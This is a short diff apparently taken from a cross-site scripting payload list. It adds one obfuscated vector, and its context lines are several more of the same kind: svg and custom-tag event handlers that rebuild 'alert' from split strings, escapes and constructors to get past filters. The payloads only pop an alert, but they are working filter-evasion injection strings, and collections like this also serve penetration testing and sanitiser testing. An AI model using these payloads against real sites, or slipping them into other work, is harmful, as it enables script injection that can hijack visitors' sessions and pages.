@@ -65,4 +65,5 @@ on<>mouseover="ale<>rt()">
 <svg/onload=WeakSet.constructor`al\x65rt\x28/xss/\x29```>
 « <svg onload\r\n=$.globalEval("al"+"ert()");> »
 « <svg/onload=self[`aler`%2b`t`]`1`> »
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
 
